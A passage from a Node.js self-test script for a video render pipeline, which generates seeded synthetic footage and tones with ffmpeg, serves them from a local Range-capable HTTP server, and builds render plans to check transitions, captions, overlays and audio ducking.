#!/usr/bin/env node
// End-to-end self-test for the render pipeline.
//
//   npm run render:selftest            # vertical + landscape + mix + sound + transitions + splits + cuts + resources
//                                      # + nested + slides + slides-vertical + motion + motion-resources
//                                      # + motion-security, square stills
//   npm run render:selftest -- --only vertical
//
// 1. Generates synthetic media with ffmpeg into .selftest/media
// 2. Serves it from 127.0.0.1 with HTTP Range support (like the Go worker)
// 3. Writes plans exercising cut / crossfade / dip-to-black, off-center fill,
//    fit letterboxing, every overlay template, word-level emphasis captions
//    and a ducked music bed; the "mix" variant renders Go-style gain envelopes
//    (muted source, music ducked under narration, clip audio ducked under
//    narration, a sped-up narration element) and measures each tone's band;
//    the "sound" variant plays a clip's sound and a dialogue track from their
//    clearer copies (variant) and checks that only the copies are heard, from
//    the right place in them
// 4. Runs render/render.mjs, checks the JSON-lines contract, verifies the
//    output with ffprobe (dimensions, frame count, duration, audio, ducking)
// 5. Extracts review frames to .selftest/frames/*.png
// The "transitions", "splits" and "cuts" variants render plans Go resolved
// (render/fixtures/transitions.json, kept current by a Go test): every transition
// type is checked by the colors on each side of its midpoint, the split edits by
// when each clip's tone starts and stops, and the blend at a straight cut by the
// audio's sample jump and high-frequency energy around the cut.
// The "motion" variant renders an approved project motion graphic (the
// route-map fixture) over footage; "motion-resources" one that draws the cut's
// resources (a logo named in quotes, a picture named by a parameter) served by
// hash like any template's; "motion-security" shows the render jail:
// a component that reaches for the network (even through lookups the import
// scan can't see) gets nothing out, Node won't download for it, a stuck
// component and an over-long render are stopped, and an over-size bundle, a
// forbidden import or a mismatched archive never render.
// The "resources" variant (Go-resolved) draws an SVG logo on a title card and
// in a corner, an end card over a picture, and a brand font file; "nested"
// plays another project's cut inside this one (its picture, its lower third
// and its sound, flattened by Go into this plan's audio).
// The "slides" and "slides-vertical" variants (Go-resolved, 1280x720 and
// 720x1280) show every slide template back to back over footage they hide:
// a title slide with a logo, points that appear one by one, a code picture, a
// diagram on its card, a web page in a browser window, the whole page
// scrolling in it, the phone picture in a phone, and a quote beside a photo.
// Each is checked by the colours its pictures carry (and the scroll by which
// of the whole page's bands shows early and late).
// The "name-bar" variant (Go-resolved, D162/D163) is one name.bar for the whole
// video whose name changes at moments in the footage: the bar stays solid over
// every clip and each new name starts on the exact frame its segment starts.
// The "house-style" variant (D198, D199): the bar about half as tall with the
// footage below it, names that never animate, large captions at the top, and
// a title card showing the logo made for its dark background.
// The "layout-pack" variant (D263–D265): a call's side-by-side layout with a
// wide gap showing the brand's background and a line in its accent, a round
// inset bottom left, and the end.screen template leaving room for a
// platform's elements.
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseArgs } from 'node:util';
import { component, makeArchive } from './motion/testkit.mjs';

const VIDEO_DIR = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const OUT = path.join(VIDEO_DIR, '.selftest');
const MEDIA = path.join(OUT, 'media');
const FRAMES = path.join(OUT, 'frames');
const FPS = 30;

const { values: args } = parseArgs({
  options: { only: { type: 'string' }, 'skip-stills': { type: 'boolean' } },
});
const only = args.only
  ? args.only.split(',')
  : ['vertical', 'landscape', 'mix', 'sound', 'transitions', 'splits', 'cuts', 'resources', 'nested', 'conversation', 'conversation-names', 'sync', 'slides', 'slides-vertical', 'name-bar', 'house-style', 'layout-pack', 'follow', 'qa-zones', 'motion', 'motion-resources', 'motion-security'];

const say = (...a) => process.stderr.write(`[selftest] ${a.join(' ')}\n`);
let failures = 0;
const check = (ok, what) => {
  say(`${ok ? 'PASS' : 'FAIL'}  ${what}`);
  if (!ok) failures++;
};

const which = (bin) => {
  try {
    return execFileSync('/usr/bin/which', [bin], { encoding: 'utf8' }).trim();
  } catch {
    return null;
  }
};
const FFMPEG = which('ffmpeg');
const FFPROBE = which('ffprobe');
if (!FFMPEG || !FFPROBE) {
  say('ffmpeg and ffprobe must be on PATH');
  process.exit(1);
}

// --- 1. synthetic media --------------------------------------------------------
// ffmpeg's gradients and noise sources are random unless seeded, so every seed is
// fixed: the footage is the same on every machine, and a failure reproduces anywhere.
// (Unseeded, one checkout's footage brightened where another's darkened.)
// Speech-like tone bursts so clip audio is audible and intermittent.
const burst = (hz, level) => `${level}*sin(2*PI*${hz}*t)*gt(sin(2*PI*0.7*t)\\,-0.2)`;
const MEDIA_SPECS = {
  'landscape.mp4': {
    video: 'testsrc2=size=1920x1080:rate=30',
    audio: `aevalsrc=${burst(440, 0.22)}:s=48000:c=stereo`,
    seconds: 12,
  },
  'bright.mp4': {
    // Bright, low-contrast footage: the legibility worst case for light text. No audio track.
    video:
      'gradients=s=1920x1080:c0=0xf4efe6:c1=0xd5e2ec:c2=0xfffdf8:c3=0xe6d6bd:nb_colors=4:speed=0.015:rate=30:seed=1101,format=yuv420p,noise=c0s=5:c0f=t:all_seed=1102',
    audio: null,
    seconds: 12,
  },
  'portrait.mp4': {
    video:
      'gradients=s=1080x1920:c0=0x23324a:c1=0xb8794d:c2=0x18262b:c3=0x6f8494:nb_colors=4:speed=0.02:rate=30:seed=2201,format=yuv420p,noise=c0s=7:c0f=t:all_seed=2202',
    audio: `aevalsrc=${burst(330, 0.22)}:s=48000:c=stereo`,
    seconds: 12,
  },
  // Continuous tones for the mix variant, each in its own frequency band.
  'src550.mp4': { video: 'testsrc2=size=1920x1080:rate=30', audio: 'aevalsrc=0.2*sin(2*PI*550*t):s=48000:c=stereo', seconds: 6 },
  'src700.mp4': {
    video: 'gradients=s=1920x1080:c0=0x1d2a3a:c1=0x6a4e3c:nb_colors=2:speed=0.02:rate=30:seed=3301,format=yuv420p',
    audio: 'aevalsrc=0.2*sin(2*PI*700*t):s=48000:c=stereo',
    seconds: 6,
  },
  'vo1000.m4a': { video: null, audio: 'aevalsrc=0.25*sin(2*PI*1000*t):s=48000:c=stereo', seconds: 6 },
  // Clearer copies of recordings for the sound variant: silent for the first
  // second, then a tone of their own, so a copy played from the wrong place is
  // heard late and the recording itself is told apart by its own tone.
  'clear1200.m4a': { video: null, audio: 'aevalsrc=0.2*sin(2*PI*1200*t)*gte(t\\,1):s=48000:c=stereo', seconds: 6 },
  'clear1500.m4a': { video: null, audio: 'aevalsrc=0.2*sin(2*PI*1500*t)*gte(t\\,1):s=48000:c=stereo', seconds: 6 },
  // Solid colors (a dark square in the middle shows movement), each with its own
  // tone that starts at full level (so a straight cut between them clicks).
  'red.mp4': { video: 'color=c=0xC83C32:s=1280x720:rate=30,drawbox=x=540:y=260:w=200:h=200:color=0x101010:t=fill', audio: 'aevalsrc=0.35*cos(2*PI*550*t):s=48000:c=stereo', seconds: 6 },
  'blue.mp4': { video: 'color=c=0x2D55C8:s=1280x720:rate=30,drawbox=x=540:y=260:w=200:h=200:color=0x101010:t=fill', audio: 'aevalsrc=-0.35*cos(2*PI*700*t):s=48000:c=stereo', seconds: 6 },
  'green.mp4': { video: 'color=c=0x32A050:s=1280x720:rate=30,drawbox=x=540:y=260:w=200:h=200:color=0x101010:t=fill', audio: 'aevalsrc=0.35*sin(2*PI*850*t+1.2):s=48000:c=stereo', seconds: 6 },
  // A red square sliding right across grey at 160 px a second (framing that
  // follows movement, D115), with a tone.
  'mover.mp4': {
    video: "color=c=0x808080:s=1280x720:rate=30[bg];color=c=0xC83C32:s=120x120:rate=30[sq];[bg][sq]overlay=x='100+160*t':y=300[out0]",
    audio: `aevalsrc=${burst(600, 0.2)}:s=48000:c=stereo`,
    seconds: 6,
  },
  // Plain dark footage: anything bright on it is a caption or a graphic (the
  // on-screen checks' geometry, D116).
  'dark.mp4': { video: 'color=c=0x202020:s=1280x720:rate=30', audio: `aevalsrc=${burst(500, 0.2)}:s=48000:c=stereo`, seconds: 6 },
  'music.m4a': {
    video: null,
    audio:
      'aevalsrc=(0.16*sin(2*PI*220*t)+0.12*sin(2*PI*277.18*t)+0.12*sin(2*PI*329.63*t))*(0.8+0.2*sin(2*PI*0.25*t)):s=48000:c=stereo',
    seconds: 40,
  },
};

const generateMedia = () => {
  fs.mkdirSync(MEDIA, { recursive: true });
  for (const [name, spec] of Object.entries(MEDIA_SPECS)) {
    const file = path.join(MEDIA, name);
    const sig = `${file}.spec`;
    const want = JSON.stringify(spec);
    if (fs.existsSync(file) && fs.existsSync(sig) && fs.readFileSync(sig, 'utf8') === want) continue;
    say(`generating ${name}`);
    const a = ['-hide_banner', '-loglevel', 'error', '-y'];
    if (spec.video) a.push('-f', 'lavfi', '-i', spec.video);
    if (spec.audio) a.push('-f', 'lavfi', '-i', spec.audio);
    a.push('-t', String(spec.seconds));
    if (spec.video) a.push('-c:v', 'libx264', '-preset', 'veryfast', '-crf', '20', '-pix_fmt', 'yuv420p', '-g', '30');
    if (spec.audio) a.push('-c:a', 'aac', '-b:a', '160k');
    a.push('-movflags', '+faststart', file);
    execFileSync(FFMPEG, a, { stdio: ['ignore', 'inherit', 'inherit'] });
    fs.writeFileSync(sig, want);
  }
  // Resource files for the "resources" variant: an SVG logo (magenta, so it is
  // easy to find in a frame), a solid yellow picture and a bundled OFL font.
  fs.writeFileSync(
    path.join(MEDIA, 'logo.svg'),
    '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="160" viewBox="0 0 400 160"><rect width="400" height="160" rx="36" fill="#E0218A"/><circle cx="80" cy="80" r="44" fill="#FFFFFF"/></svg>\n',
  );
  const photo = path.join(MEDIA, 'photo.png');
  if (!fs.existsSync(photo)) {
    execFileSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-y', '-f', 'lavfi', '-i', 'color=c=0xFFD400:s=640x360', '-frames:v', '1', photo]);
  }
  const font = path.join(VIDEO_DIR, '..', 'node_modules', '@fontsource-variable', 'fraunces', 'files', 'fraunces-latin-opsz-normal.woff2');
  fs.copyFileSync(fs.existsSync(font) ? font : path.join(VIDEO_DIR, 'node_modules', '@fontsource-variable', 'fraunces', 'files', 'fraunces-latin-opsz-normal.woff2'), path.join(MEDIA, 'brand.woff2'));
  // Pictures for the "slides" variants (exact colours: boxes drawn in RGB).
  for (const [name, filter] of Object.entries(SLIDE_PICTURES)) {
    const file = path.join(MEDIA, name);
    const sig = `${file}.spec`;
    if (fs.existsSync(file) && fs.existsSync(sig) && fs.readFileSync(sig, 'utf8') === filter) continue;
    say(`generating ${name}`);
    execFileSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-y', '-f', 'lavfi', '-i', filter, '-frames:v', '1', file]);
    fs.writeFileSync(sig, filter);
  }
  fs.writeFileSync(path.join(MEDIA, 'diagram.svg'), DIAGRAM_SVG);
  // Two people's microphones for the "sync" variants (D119): bursts of noise
  // at times of their own (ffmpeg's random() is a fixed sequence), as PCM so
  // the only coding is the render's, mono at 48 kHz.
  for (const [name, expr] of Object.entries(SYNC_VOICES)) {
    const file = path.join(MEDIA, name);
    const sig = `${file}.spec`;
    if (fs.existsSync(file) && fs.existsSync(sig) && fs.readFileSync(sig, 'utf8') === expr) continue;
    say(`generating ${name}`);
    execFileSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-y', '-f', 'lavfi', '-i', `aevalsrc=${expr}:s=48000:c=mono`, '-t', '8', '-c:a', 'pcm_s16le', file]);
    fs.writeFileSync(sig, expr);
  }
};

const SYNC_VOICES = {
  'voice-a.wav': '0.45*(2*random(0)-1)*lt(mod(t\\,0.37)\\,0.03)',
  'voice-b.wav': '0.45*(2*random(1)-1)*lt(mod(t+0.11\\,0.43)\\,0.04)',
};

// --- slide pictures ------------------------------------------------------------
// Each carries a colour found nowhere else in the slides plan (nor in its
// footage), so a check can tell which picture is on screen: the code panel a
// magenta box, the diagram cyan boxes, the desktop page an orange header, the
// phone page lime, and the whole page a violet top band and a spring-green
// bottom band (a scroll shows one early and the other late).
const fillBox = (x, y, w, h, c) => `drawbox=x=${x}:y=${y}:w=${w}:h=${h}:color=0x${c}:t=fill`;
const picture = (w, h, bg, boxes) => [`color=c=0x${bg}:s=${w}x${h}`, 'format=rgb24', ...boxes.map((b) => fillBox(...b))].join(',');

/** Code lines as [indent, ...[token width, colour]], like a highlighted panel. */
const CODE_LINES = [
  [0, [150, 'FF7B72'], [260, 'D2A8FF'], [90, 'E6EDF3']],
  [1, [120, 'FF7B72'], [300, '79C0FF']],
  [1, [200, 'E6EDF3'], [160, 'A5D6FF']],
  [2, [140, 'FF7B72'], [360, '7EE787']],
  [2, [260, 'E6EDF3'], [120, '79C0FF']],
  [1, [60, 'E6EDF3']],
  [1, [130, 'FF7B72'], [210, 'D2A8FF'], [140, 'A5D6FF']],
  [2, [320, 'E6EDF3']],
  [2, [180, '79C0FF'], [240, 'A5D6FF']],
  [1, [60, 'E6EDF3']],
  [0, [40, 'E6EDF3']],
];
const codeBoxes = () => {
  const out = [[0, 0, 1600, 84, '161B22'], [34, 32, 20, 20, '30363D'], [66, 32, 20, 20, '30363D'], [98, 32, 20, 20, '30363D'], [150, 30, 240, 24, 'C9D1D9'], [410, 30, 120, 24, '8B949E']];
  // A highlighted line (accent band and bar), as MetaRush draws them.
  out.push([0, 140 + 3 * 66 - 14, 1600, 54, '2A2318'], [0, 140 + 3 * 66 - 14, 8, 54, 'E0A458']);
  CODE_LINES.forEach(([indent, ...tokens], i) => {
    const y = 140 + i * 66;
    out.push([60, y, 44, 26, '484F58']);
    let x = 150 + indent * 64;
    for (const [w, c] of tokens) {
      out.push([x, y, w, 26, c]);
      x += w + 18;
    }
  });
  out.push([1060, 280, 400, 280, 'E0218A']);
  return out;
};

const SLIDE_PICTURES = {
  'code.png': picture(1600, 1000, '0D1117', codeBoxes()),
  'site-desktop.png': picture(1440, 900, 'FFFFFF', [
    [0, 0, 1440, 96, 'FF6D00'], [120, 180, 640, 56, '1F2328'], [120, 260, 520, 24, '8C959F'], [120, 300, 460, 24, '8C959F'],
    [120, 360, 200, 56, 'FF6D00'], [820, 170, 500, 320, 'E9ECEF'], [120, 560, 360, 240, 'F1F3F5'], [540, 560, 360, 240, 'F1F3F5'], [960, 560, 360, 240, 'F1F3F5'],
  ]),
  'site-phone.png': picture(390, 844, '8BE000', [
    [24, 120, 342, 40, 'FFFFFF'], [24, 180, 260, 24, 'FFFFFF'], [24, 260, 342, 220, 'FFFFFF'], [24, 500, 342, 120, 'FFFFFF'], [24, 640, 342, 120, 'FFFFFF'],
  ]),
  'site-full.png': picture(1440, 3600, 'FFFFFF', [
    [0, 0, 1440, 720, '7B2FF7'], [120, 220, 760, 72, 'FFFFFF'], [120, 320, 560, 28, 'D9C8FF'],
    [0, 720, 1440, 720, 'F4F6F8'], [120, 860, 1200, 300, 'E3E7EC'],
    [0, 1440, 1440, 720, 'FFF4E0'], [120, 1580, 540, 420, 'F3E3C3'], [780, 1580, 540, 420, 'F3E3C3'],
    [0, 2160, 1440, 720, 'E8F1FF'], [120, 2300, 1200, 300, 'D3E2FA'],
    [0, 2880, 1440, 720, '00F5A0'], [120, 3060, 640, 60, 'FFFFFF'],
  ]),
};

/** A small architecture diagram: four cyan boxes joined by arrows, no text (fonts differ between machines). */
const DIAGRAM_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="960" height="540" viewBox="0 0 960 540">
<defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#3A4150"/></marker></defs>
<g stroke="#3A4150" stroke-width="6" fill="none" marker-end="url(#a)"><path d="M262 238L364 160"/><path d="M262 302L364 380"/><path d="M592 160L694 238"/><path d="M592 380L694 302"/></g>
<g fill="#00B8D9"><rect x="40" y="200" width="220" height="140" rx="20"/><rect x="370" y="60" width="220" height="140" rx="20"/><rect x="370" y="340" width="220" height="140" rx="20"/><rect x="700" y="200" width="220" height="140" rx="20"/></g>
<g fill="#FFFFFF" opacity="0.85"><rect x="80" y="252" width="140" height="16" rx="8"/><rect x="410" y="112" width="140" height="16" rx="8"/><rect x="410" y="392" width="140" height="16" rx="8"/><rect x="740" y="252" width="140" height="16" rx="8"/></g>
</svg>
`;

// --- 2. HTTP server with Range support ---------------------------------------
const MIME = { '.mp4': 'video/mp4', '.m4a': 'audio/mp4', '.wav': 'audio/wav', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.woff2': 'font/woff2' };

/** What a render asked the media server for that it didn't have (printed when a check fails). */
const MEDIA_MISSES = [];
/** Every file a render asked the media server for. */
const MEDIA_HITS = new Set();

const startServer = () =>
  new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      const name = decodeURIComponent(new URL(req.url, 'http://x').pathname).replace(/^\/+/, '');
      const file = path.join(MEDIA, path.basename(name));
      if (!name || !fs.existsSync(file)) {
        MEDIA_MISSES.push(name || '/');
        res.writeHead(404).end('not found');
        return;
      }
      MEDIA_HITS.add(path.basename(name));
      const size = fs.statSync(file).size;
      const headers = {
        'Content-Type': MIME[path.extname(file)] ?? 'application/octet-stream',
        'Accept-Ranges': 'bytes',
        'Access-Control-Allow-Origin': '*',
      };
      const range = req.headers.range;
      let start = 0;
      let end = size - 1;
      let status = 200;
      if (range) {
        const m = /^bytes=(\d*)-(\d*)$/.exec(range.trim());
        if (!m || (m[1] === '' && m[2] === '')) {
          res.writeHead(416, { 'Content-Range': `bytes */${size}` }).end();
          return;
        }
        if (m[1] === '') {
          start = Math.max(0, size - Number(m[2]));
        } else {
          start = Number(m[1]);
          end = m[2] === '' ? size - 1 : Math.min(size - 1, Number(m[2]));
        }
        if (start > end || start >= size) {
          res.writeHead(416, { 'Content-Range': `bytes */${size}` }).end();
          return;
        }
        status = 206;
        headers['Content-Range'] = `bytes ${start}-${end}/${size}`;
      }
      headers['Content-Length'] = String(end - start + 1);
      res.writeHead(status, headers);
      if (req.method === 'HEAD') {
        res.end();
        return;
      }
      fs.createReadStream(file, { start, end }).pipe(res);
    });
    server.listen(0, '127.0.0.1', () => resolve(server));
  });

// --- 3. plans ----------------------------------------------------------------
// Margins as fractions (top, bottom, left, right), copied from Go's platformSafe.
const PLATFORM_SAFE = {
  generic: [0.06, 0.08, 0.06, 0.06],
  youtube: [0.06, 0.1, 0.06, 0.06],
  shorts: [0.1, 0.2, 0.06, 0.12],
};

const sec = (s) => Math.round(s * FPS);

/** Mirrors Go's Timeline(): crossfades overlap, dips set the previous fadeOut. */
const placeClips = (specs) => {
  const out = [];
  let pos = 0;
  specs.forEach((c, i) => {
    const dur = Math.round(((c.out - c.in) / (c.speed ?? 1)) * FPS);
    const tr = { type: c.transition?.type ?? 'cut', durationInFrames: c.transition ? sec(c.transition.duration) : 0 };
    if (tr.type === 'crossfade' && i > 0) {
      tr.durationInFrames = Math.min(tr.durationInFrames, Math.floor(Math.min(out[i - 1].durationInFrames, dur) / 2));
      pos -= tr.durationInFrames;
    }
    if (tr.type === 'dip-to-black' && i > 0 && out[i - 1].fadeOutFrames < Math.floor(tr.durationInFrames / 2)) {
      out[i - 1].fadeOutFrames = Math.floor(tr.durationInFrames / 2);
    }
    out.push({
      id: c.id,
      assetId: c.assetId,
      from: pos,
      durationInFrames: dur,
      trimBefore: Math.round(c.in * FPS),
      sourceIn: c.in,
      sourceOut: c.out,
      playbackRate: c.speed ?? 1,
      volume: 1,
      muted: false,
      hasAudio: c.hasAudio,
      sourceWidth: c.w,
      sourceHeight: c.h,
      framing: { mode: 'fill', focusX: 0.5, focusY: 0.5, zoom: 1, ...c.framing },
      transitionIn: tr,
      fadeOutFrames: 0,
      label: c.label,
    });
    pos += dur;
  });
  return { clips: out, total: pos };
};

const SCRIPT = [
  // [start frame, text, emphasized words]
  [84, 'We came for the northern lights,', []],
  [128, 'and stayed for the silence.', ['silence']],
  [342, 'Every morning starts in the dark.', ['dark']],
  [428, 'Out here, the light arrives slowly.', []],
  [474, 'You learn to wait for it.', ['wait']],
  [520, 'And then it is everywhere.', ['everywhere']],
];

const buildCaptions = () => {
  const lines = SCRIPT.map(([start, text, emph]) => {
    let t = start;
    const words = text.split(' ').map((w) => {
      const len = 5 + Math.min(6, Math.round(w.length * 0.9));
      const word = { text: w, from: t, to: t + len, emphasis: emph.includes(w.toLowerCase().replace(/[^a-z]/g, '')) };
      t += len + 1;
      return word;
    });
    return { from: words[0].from, to: words[words.length - 1].to, text, words };
  });
  // Like Go: hold each line until the next starts when the gap is < 0.5s.
  for (let i = 0; i + 1 < lines.length; i++) {
    const gap = lines[i + 1].from - lines[i].to;
    if (gap > 0 && gap < FPS / 2) lines[i].to = lines[i + 1].from;
  }
  return lines;
};

const mergeRanges = (lines) => {
  const merged = [];
  for (const l of lines) {
    const last = merged[merged.length - 1];
    if (last && l.from <= last.to + FPS / 2) last.to = Math.max(last.to, l.to);
    else merged.push({ from: l.from, to: l.to });
  }
  return merged;
};

const buildPlan = ({ width, height, platform, variant }, baseUrl) => {
  const [t, b, l, r] = PLATFORM_SAFE[platform];
  const { clips, total } = placeClips([
    {
      id: 'c1', assetId: 'landscape', in: 1, out: 8, w: 1920, h: 1080, hasAudio: true, label: 'arrival',
      framing: { mode: 'fill', focusX: 0.3, focusY: 0.5 },
    },
    {
      id: 'c2', assetId: 'bright', in: 0.5, out: 7.5, w: 1920, h: 1080, hasAudio: false, label: 'snowfield',
      framing: { mode: 'fit' }, transition: { type: 'crossfade', duration: 0.5 },
    },
    {
      id: 'c3', assetId: 'portrait', in: 1, out: 10, w: 1080, h: 1920, hasAudio: true, label: 'harbour',
      framing: { mode: 'fill', focusX: 0.5, focusY: 0.4, zoom: 1.1 }, transition: { type: 'dip-to-black', duration: 0.67 },
    },
  ]);
  const lines = buildCaptions();
  const square = variant === 'square';
  return {
    schemaVersion: 1,
    revisionId: `rev_selftest_${variant}`,
    projectId: 'prj_selftest',
    specHash: 'selftest',
    media: 'original',
    width,
    height,
    fps: FPS,
    durationInFrames: total,
    background: '#000000',
    brand: { primary: '#F2EDE4', accent: '#E0A458', text: '#F7F5F0', background: '#0B0B0E', font: 'Inter' },
    safeArea: { top: Math.floor(height * t), bottom: Math.floor(height * b), left: Math.floor(width * l), right: Math.floor(width * r) },
    clips,
    audio: [
      {
        id: 'a1', assetId: 'music', role: 'music', from: 0, durationInFrames: total, trimBefore: 0,
        gainDb: -8, fadeInFrames: 15, fadeOutFrames: 45, duckUnderDialogue: true, duckDb: -12,
      },
    ],
    dialogueRanges: mergeRanges(lines),
    captions: { style: 'emphasis', position: 'lower', uppercase: false, precision: 'word', lines },
    overlays: [
      { id: 'o1', template: 'title.card', templateVersion: '1', from: 0, durationInFrames: 75,
        params: { title: 'Northern Light', subtitle: 'Notes from a winter on the coast' } },
      { id: 'o2', template: 'lower-third.clean', templateVersion: '1', from: 90, durationInFrames: 105,
        params: { name: 'Maren Okafor', title: 'Sound recordist and field producer', ...(square ? { align: 'right' } : {}) } },
      { id: 'o3', template: 'quote.kinetic', templateVersion: '1', from: 215, durationInFrames: 120,
        params: { text: 'The first week, I chased every sunrise. By the second, I had learned to wait for it.',
          attribution: 'Maren Okafor, field notes', emphasis: ['wait for it'] } },
      { id: 'o4', template: 'lower-third.cinematic', templateVersion: '1', from: 425, durationInFrames: 90,
        params: { name: 'Henningsvaer', title: 'Lofoten, Norway', ...(square ? { align: 'center' } : {}) } },
      { id: 'o5', template: 'datacard.stat', templateVersion: '1', from: 525, durationInFrames: 85,
        params: { value: '1,840', label: 'hours of audio logged across the season', context: 'Up from 610 the winter before',
          source: 'Production log, winter 2025 (sample data)', trend: 'up' } },
      { id: 'o6', template: 'endcard.cta', templateVersion: '1', from: 610, durationInFrames: total - 610,
        params: { headline: 'Hear the full recording', subline: 'New episodes every other Thursday.', cta: 'Listen now', handle: 'northernlight' } },
      { id: 'o7', template: 'does.not.exist', templateVersion: '1', from: 0, durationInFrames: 30, params: {} },
    ],
    sources: {
      landscape: `${baseUrl}/landscape.mp4`,
      bright: `${baseUrl}/bright.mp4`,
      portrait: `${baseUrl}/portrait.mp4`,
      music: `${baseUrl}/music.m4a`,
    },
  };
};

// --- the mix variant: envelopes exactly as Go emits them ---------------------
const dbl = (db) => 10 ** (db / 20);

/** Keyframes for a level that ducks by `duckDb` over [from, to) with ramps (element frames). */
const duckedEnvelope = (len, base, duckDb, from, to, attack, release) => {
  const low = base * dbl(duckDb);
  const pts = [];
  if (from - attack > 0) pts.push({ f: 0, g: base }, { f: from - attack, g: base }, { f: from, g: low });
  else pts.push({ f: 0, g: low });
  pts.push({ f: to, g: low });
  if (to + release < len - 1) pts.push({ f: to + release, g: base }, { f: len - 1, g: base });
  else pts.push({ f: len - 1, g: low });
  return pts;
};

const MIX = { total: 240, voFrom: 60, voTo: 150, attack: 8, release: 15 };

const buildMixPlan = (baseUrl) => {
  const { total, voFrom, voTo, attack, release } = MIX;
  const clip = (id, assetId, from, extra) => ({
    id, assetId, from, durationInFrames: 120, trimBefore: 0, sourceIn: 0, sourceOut: 4, playbackRate: 1, volume: 1, muted: false,
    hasAudio: true, sourceWidth: 1920, sourceHeight: 1080, framing: { mode: 'fill', focusX: 0.5, focusY: 0.5, zoom: 1 },
    transitionIn: { type: 'cut', durationInFrames: 0 }, fadeOutFrames: 0, ...extra,
  });
  return {
    schemaVersion: 1, revisionId: 'rev_selftest_mix', projectId: 'prj_selftest', specHash: 'selftest-mix', media: 'original',
    width: 1920, height: 1080, fps: FPS, durationInFrames: total, background: '#000000',
    brand: { primary: '#F2EDE4', accent: '#E0A458', text: '#F7F5F0', background: '#0B0B0E', font: 'Inter' },
    safeArea: { top: 64, bottom: 108, left: 115, right: 115 },
    clips: [
      // The original sound of the first shot is muted (the "mute source" path).
      clip('m1', 'src550', 0, { muted: true }),
      // The second shot's sound is turned down 18 dB while narration plays (its frames 0–30).
      clip('m2', 'src700', 120, { gain: duckedEnvelope(120, 1, -18, -120, voTo - 120, attack, release) }),
    ],
    audio: [
      {
        id: 'bed', assetId: 'music', role: 'music', bus: 'music', from: 0, durationInFrames: total, trimBefore: 0, gainDb: -8,
        fadeInFrames: 0, fadeOutFrames: 0, duckUnderDialogue: false, duckDb: -12,
        gain: duckedEnvelope(total, dbl(-8), -14, voFrom, voTo, attack, release),
      },
      {
        id: 'vo-b1', assetId: 'vo1000', role: 'voiceover', bus: 'voiceover', beatId: 'b1', from: voFrom, durationInFrames: voTo - voFrom,
        trimBefore: 0, gainDb: 0, fadeInFrames: 0, fadeOutFrames: 0, duckUnderDialogue: false, duckDb: 0, playbackRate: 1.04,
        gain: [{ f: 0, g: 0.5 }, { f: 1, g: 1 }, { f: voTo - voFrom - 2, g: 1 }, { f: voTo - voFrom - 1, g: 0.5 }],
      },
    ],
    dialogueRanges: [],
    overlays: [],
    sources: { src550: `${baseUrl}/src550.mp4`, src700: `${baseUrl}/src700.mp4`, vo1000: `${baseUrl}/vo1000.m4a`, music: `${baseUrl}/music.m4a` },
  };
};

/** Mean level (dB) of one frequency band of the output between two frames. */
const bandDb = (file, hz, a, b) => {
  const r = spawnSync(
    FFMPEG,
    ['-hide_banner', '-ss', String(a / FPS), '-t', String((b - a) / FPS), '-i', file, '-vn', '-af', `bandpass=f=${hz}:width_type=h:width=40,bandpass=f=${hz}:width_type=h:width=40,volumedetect`, '-f', 'null', '-'],
    { encoding: 'utf8' },
  );
  const m = /mean_volume:\s*(-?[\d.]+) dB/.exec(r.stderr ?? '');
  return m ? Number(m[1]) : NaN;
};

const verifyMix = (plan, result, outFile) => {
  const { code, lines, stderr } = result;
  check(code === 0, `mix: render.mjs exit code 0 (got ${code})`);
  if (code !== 0) say(stderr.split('\n').slice(-30).join('\n'));
  check(lines.every((l) => l.type !== '__invalid__'), 'mix: every stdout line is JSON');
  if (code !== 0 || !fs.existsSync(outFile)) return false;
  const v = probe(outFile).streams.find((s) => s.codec_type === 'video');
  check(Math.abs(Number(v?.nb_frames) - plan.durationInFrames) <= 1, `mix: ${v?.nb_frames} frames vs plan ${plan.durationInFrames}`);
  const { voFrom, voTo } = MIX;
  const muted = bandDb(outFile, 550, 10, 110);
  check(muted < -55, `mix: the muted shot's own sound is silent (550 Hz band ${muted} dB)`);
  const musicOpen = bandDb(outFile, 220, 10, voFrom - 12);
  const musicUnder = bandDb(outFile, 220, voFrom + 10, voTo - 5);
  const musicDuck = musicOpen - musicUnder;
  check(Number.isFinite(musicDuck) && musicDuck > 11 && musicDuck < 17, `mix: music ducks under narration by ${musicDuck.toFixed(1)} dB (expect ~14)`);
  const vo = bandDb(outFile, 1000, voFrom + 10, voTo - 5);
  const voAfter = bandDb(outFile, 1000, voTo + 25, 235);
  check(vo > -40 && voAfter < -55, `mix: narration plays only in its span (${vo} dB inside, ${voAfter} dB after)`);
  const srcUnder = bandDb(outFile, 700, 123, voTo - 3);
  const srcOpen = bandDb(outFile, 700, voTo + 25, 235);
  const srcDuck = srcOpen - srcUnder;
  check(Number.isFinite(srcDuck) && srcDuck > 15 && srcDuck < 21, `mix: the shot's own sound ducks under narration by ${srcDuck.toFixed(1)} dB (expect ~18)`);
  return true;
};

// --- clearer voices: sound plays from processed copies (D88) ----------------
const SOUND = { total: 150, cut: 75 };

const buildSoundPlan = (baseUrl) => {
  const { total, cut } = SOUND;
  const flat = (n) => [{ f: 0, g: 1 }, { f: n - 1, g: 1 }];
  return {
    schemaVersion: 1, revisionId: 'rev_selftest_sound', projectId: 'prj_selftest', specHash: 'selftest-sound', media: 'original',
    width: 640, height: 360, fps: FPS, durationInFrames: total, background: '#000000',
    brand: { primary: '#F2EDE4', accent: '#E0A458', text: '#F7F5F0', background: '#0B0B0E', font: 'Inter' },
    safeArea: { top: 20, bottom: 36, left: 38, right: 38 },
    clips: [
      {
        id: 'v1', assetId: 'src550', from: 0, durationInFrames: total, trimBefore: 30, sourceIn: 1, sourceOut: 6, playbackRate: 1, volume: 1, muted: false,
